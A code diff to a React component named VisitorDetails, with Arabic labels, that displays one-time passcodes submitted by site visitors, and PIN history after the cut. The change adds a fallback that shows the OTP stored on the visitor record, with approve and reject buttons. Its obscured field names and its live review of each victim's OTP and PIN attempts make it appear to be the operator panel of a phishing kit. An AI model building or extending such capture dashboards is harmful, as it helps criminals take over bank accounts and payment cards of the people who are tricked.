@@ -266,29 +266,53 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       return timeB - timeA
     })
     
-    sortedOtpHistory.forEach((otpHistory: any, index: number) => {
-      const otp = otpHistory.data?._v5
-      const hasBeenActioned = otpHistory.status === 'approved' || otpHistory.status === 'rejected'
-      
-      if (otp) {
-        bubbles.push({
-          id: `otp-${otpHistory.id || index}`,
-          title: index === 0 ? "كود OTP" : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
-          icon: "🔑",
-          color: "pink",
-          data: {
-            "الكود": otp,
-            "الحالة": otpHistory.status === "approved" ? "✓ تم القبول" : 
-                      otpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
-          },
-          timestamp: otpHistory.timestamp,
-          status: otpHistory.status || "pending" as const,
-          showActions: !hasBeenActioned,
-          isLatest: index === 0,
-          type: "otp"
-        })
-      }
-    })
+    // If no history exists but OTP is in main document, create a bubble from it
+    if (sortedOtpHistory.length === 0 && (visitor as any)._v5) {
+      const otpStatus = (visitor as any)._v5Status || 'pending'
+      bubbles.push({
+        id: 'otp-current',
+        title: "كود OTP",
+        icon: "🔑",
+        color: "pink",
+        data: {
+          "الكود": (visitor as any)._v5,
+          "الحالة": otpStatus === "approved" ? "✓ تم القبول" : 
+                    otpStatus === "rejected" ? "✗ تم الرفض" : 
+                    otpStatus === "verifying" ? "⬳ قيد المراجعة" : "⬳ قيد المراجعة"
+        },
+        timestamp: (visitor as any).otpUpdatedAt || visitor.updatedAt,
+        status: otpStatus === "approved" ? "approved" as const : 
+                otpStatus === "rejected" ? "rejected" as const : "pending" as const,
+        showActions: otpStatus !== "approved" && otpStatus !== "rejected",
+        isLatest: true,
+        type: "otp"
+      })
+    } else {
+      // Show history entries
+      sortedOtpHistory.forEach((otpHistory: any, index: number) => {
+        const otp = otpHistory.data?._v5
+        const hasBeenActioned = otpHistory.status === 'approved' || otpHistory.status === 'rejected'
+        
+        if (otp) {
+          bubbles.push({
+            id: `otp-${otpHistory.id || index}`,
+            title: index === 0 ? "كود OTP" : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
+            icon: "🔑",
+            color: "pink",
+            data: {
+              "الكود": otp,
+              "الحالة": otpHistory.status === "approved" ? "✓ تم القبول" : 
+                        otpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+            },
+            timestamp: otpHistory.timestamp,
+            status: otpHistory.status || "pending" as const,
+            showActions: !hasBeenActioned,
+            isLatest: index === 0,
+            type: "otp"
+          })
+        }
+      })
+    }
     
     // PIN Code - Show ALL attempts from history (newest first)
     const allPinHistory = visitor.history?.filter((h: any) => h.type === '_t3' || h.type === 'pin') || []
